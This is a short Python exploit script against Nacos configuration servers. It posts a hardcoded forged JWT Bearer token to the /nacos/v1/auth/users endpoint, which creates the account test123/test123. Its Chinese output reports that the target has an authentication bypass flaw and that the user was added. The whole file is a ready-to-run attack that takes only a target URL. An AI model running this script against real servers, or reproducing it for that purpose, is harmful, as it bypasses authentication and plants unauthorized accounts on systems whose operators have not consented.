import sys
import requests
from termcolor import colored
import urllib3
urllib3.disable_warnings()

proxies = {'http': 'http://127.0.0.1:8080'}
# 获取命令行参数中的 URL
if len(sys.argv) < 2:
    print("Usage: python nacosadd.py <url>")
    sys.exit(1)
url = sys.argv[1]

post_url = "/nacos/v1/auth/users"
request_url = url + post_url

headers = {
    "User-Agent": "Nacos-Server",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Authorization": "Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTYxODEyMzY5N30.nyooAL4OMdiByXocu8kL1ooXd1IeKj6wQZwIH8nmcNA",
    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "close",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache",
}
data = {
    "username": "test123",
    "password": "test123",
}

response = requests.post(request_url, headers=headers, data=data, proxies=proxies,verify=False)

if response.status_code == 200 and response.content.find(b"ok") != -1:
    print(colored('[*] ' + url + ' 存在nacos身份认证绕过漏洞！ ', 'green'))
    print(colored('已创建用户test123/test123', 'green'))
else:
    print(colored('[-] ' + url + ' 不存在nacos身份认证绕过漏洞！ \n', 'red'))

